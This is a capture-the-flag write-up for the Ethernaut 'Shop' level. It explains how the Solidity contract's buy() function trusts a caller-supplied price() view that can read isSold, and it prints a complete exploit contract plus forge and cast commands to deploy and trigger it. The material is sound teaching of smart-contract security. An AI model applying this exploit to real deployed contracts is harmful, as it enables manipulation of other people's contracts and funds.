@@ -1,0 +1,77 @@
+"This level requires us to buy the product from a shop for less than the price asked. It is eerily similar to Level 11 - Elevator, but with a caveat. Let's dive in. 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+
+The buy() function is checking if the price value returned by the Buyer interface is greater than the price defined (100) and if the product is already sold. If the if statement validation goes through, the isSold is set to true, and the price is set to the new price returned by the Buyer interface. 
+buy()
+if
+isSold
+true
+The contract defines an interface called Buyer but the buy function is using msg.sender's address to create an instance. This means that we can deploy an attacker contract with a price() function in it and it will be called by the buy() function when checking the price. 
+Buyer
+msg.sender
+price()
+buy()
+Something which should be observed here is that the price() is a view function, i.e., it can not change the state so we can not maintain a state variable as we did in the Elevator but we can make external calls to functions that are view or pure. 
+price()
+Therefore, to return two values from our price() function, we can make it return values based on the variable isSold. 
+price()
+isSold
+function price () external view returns (uint) {
+    return level21.isSold() ? 1 : 101;
+}
+
+Let's take a look at the exploit code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel21.sol"";
+
+contract BrokenShop {
+
+    Shop level21 = Shop(0x9350Bd45e706BCE78Ff84C9eB91503018fFd86F3);
+
+    function exploit() external {
+        level21.buy();
+    }
+
+    function price () external view returns (uint) {
+        return level21.isSold() ? 1 : 101;
+    }
+}
+
+Deploy the contract above using the following command:
+forge create BrokenShop --private-key $PKEY --rpc-url $RPC_URL
+
+and call the exploit() function to trigger the exploit:
+exploit()
+cast send 0x5641B5ab8cc6c1FF0225c3BcaaDE972BD958F8a9 ""exploit()"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+Our exploit code will call the buy() function which will then make a call to the price() function defined in our contract. The function will return 101 which is more than the price defined in the Shop if isSold is set to false, otherwise, it will return 1. The new price can be checked in the console using await contract.price(). 
+buy()
+price()
+isSold
+false
+await contract.price()
+The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e.."
